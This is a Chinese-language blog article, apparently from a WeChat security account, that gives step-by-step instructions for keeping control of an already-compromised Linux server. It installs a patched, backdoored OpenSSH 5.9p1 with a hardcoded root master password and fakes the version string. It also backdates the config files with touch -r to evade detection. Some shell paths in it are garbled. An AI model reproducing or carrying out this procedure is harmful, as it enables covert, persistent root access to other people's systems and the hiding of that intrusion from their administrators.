> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nxVXt1a4UaA09SJ-lcV_pw)

**0x00 前言**
-----------

虽然可以 ssh 连进去，但是可否长期进行控制呢？这里就涉及到 ssh 后门的问题了，本次就是通过 WinSCP 与 Linux 服务器进行连接，然后配置安装 SSH 后门，这次实验主要目的通过实践学习熟悉 Linux SSH 后门的安装过程和步骤。

**0x01** **配置 SSH 后门**
----------------------

### 2.1：建立连接

### 利用 winSCP 工具（也可以选用其他工具）连接已知（即已经渗透成功的服务器）服务器，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazL0fyk1LFgLAtO5D5AuFGUEsmdMbibCayETaW4sp2gWA7yOHEbarhg9Jw/640?wx_fmt=png)

连接成功后：![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazLw1xkKGV6s7uEv5GQx6SaF9QtCzr7mFGd0Pe6QI6O77uaruMY7E7Agw/640?wx_fmt=png)

用 SecureCRT 连接成功后如图：![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazLx65mY3nU6ickw19ZVzO7mxunRDEQoYMyXUI7ajvHrcL3ePgicAgicLa9A/640?wx_fmt=png)

通过`ssh -V`查看当前 SSH 版本  

上传带有后门的 SSH 安装包

上传工具（上面提到的 WinSCP、SecureCRT、putty 都可以，自行选择）![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazLHWo1ibcUJG4rMUdytcMlyPYuPPc4qGuVOtmaiaaIxhdIz3oCAWhDTmOg/640?wx_fmt=png)

解压上传的安装包  

```
tar zxf openssh-5.9p1.tar.gz
tar zxf 0x06-openssh-5.9p1.patch.tar.gz
```

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazLo7lApoCdfQRbviavzxuFpd2spjyticBnKIGOgJzsC1bCnTnQyMSA55icA/640?wx_fmt=png)  

执行如下命令，移动原有配置文件  

```
mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
```

复制文件 sshbd5.9p1.diff 到 openssh-5.9p1 目录  

```
cd opens
sh-5.9p1.patch/
cp sshbd5.9p1.diff …/openssh-5.9p1
cd …/openssh-5.9p1
patch < sshbd5.9p1.diff
```

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazLjVyDArxibcjiaHFr6TKB0CyyQkt3bFKzFiassl8C7CE35foheMWOaxWrg/640?wx_fmt=png)

编辑 includes.h 文件，设置自己的后门密码  

```
vi includes.h
```

找到 #define SECRETPW “apaajaboleh” // apaajaboleh 为后门的密码 可修改成自己设定的密码，如图![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazLicJ6oK2ltMSL8jysSaoS4dPhqoEZp7vd0K1wD3xLP0QpMxIe3KXQIqw/640?wx_fmt=png)

修改当前系统的 SSH 版本

通过`ssh -V`查看当前 SSH 版本，记录下来

vi version.h 修改 version.h 文件的版本信息![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazLkQvSpePg2sHibv8bVic8FEdfJtSAQKfs0s055l5yvJicDzHt7IqDXrTxA/640?wx_fmt=png)

**0x02** **安装 SSH 后门**
----------------------

执行./configure --prefix=/usr --sysconfdir=/etc/ssh 指定配置选项

执行 make && make install 编译安装

安转完成后如图：![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazL8vI7ThgXNoml2SS3RiabYeIjSgbVEYfy00F7RRMSSc8KM92vibRalRSg/640?wx_fmt=png)

```
touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config //修改日期
touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config //修改日期
/etc/init.d/ssh restart //重启ssh服务
```

**0x03** **测试后门是否安装成功**
-----------------------

用连接工具连接 ssh，用户名为 root，密码为前面设置的 SSH 后门的密码![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4GMOYpVB8Q7uNwZPFVPiazLZOw4SUibcMeHthQA2PibzicWvNndwKvoOKEsr4a2YcgcMdLicDSMeAibkjg/640?wx_fmt=png)

公众号

最后  

-----

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**无害实验室拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的**